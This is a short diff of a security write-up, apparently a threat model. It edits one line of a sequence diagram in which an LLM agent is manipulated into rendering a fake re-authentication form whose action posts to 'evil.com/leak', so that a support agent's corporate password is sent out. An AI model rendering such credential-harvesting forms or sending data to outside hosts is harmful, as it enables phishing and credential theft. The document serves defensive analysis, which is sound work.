@@ -267,7 +267,7 @@ sequenceDiagram
     Agent->>Agent: LLM executes tool: render_form(action="https://evil.com/leak")
     Agent-->>Browser: Streams SSE frame mounting AuthFormWidget
     Browser->>Browser: Support agent sees authentic "Session Timeout Re-Auth" card
-    Browser->>Exfil: Agent types corporate password; submitted to evil.com
+    Browser->>Exfil: Agent types corporate password -  submitted to evil.com
 ```
 
 ### Root Cause Analysis (RCA)
